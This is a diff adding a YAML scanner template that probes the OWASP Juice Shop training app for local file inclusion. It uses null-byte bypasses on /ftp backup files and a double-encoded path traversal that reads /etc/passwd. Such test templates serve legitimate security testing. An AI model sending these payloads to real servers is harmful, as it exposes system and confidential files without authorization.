@@ -1,0 +1,56 @@
+id: juice-shop-lfi-null-byte
+info:
+  name: Local File Inclusion - Null Byte Injection
+  author: dast-mvp
+  severity: high
+  description: Tests for LFI vulnerabilities using null byte and path traversal
+  tags:
+    - juice-shop
+    - lfi
+    - path-traversal
+
+requests:
+  - path: /ftp/package.json.bak%2500.md
+    method: GET
+    matchers_condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - juice-shop
+          - dependencies
+
+  - path: /ftp/coupons_2013.md.bak%2500.md
+    method: GET
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - path: /ftp/..%252f..%252f..%252fetc%252fpasswd
+    method: GET
+    matchers_condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - root
+          - bin
+
+  - path: /ftp/acquisitions.md%00.pdf
+    method: GET
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - path: /ftp/package.json.bak
+    method: GET
+    matchers:
+      - type: status
+        status:
+          - 200
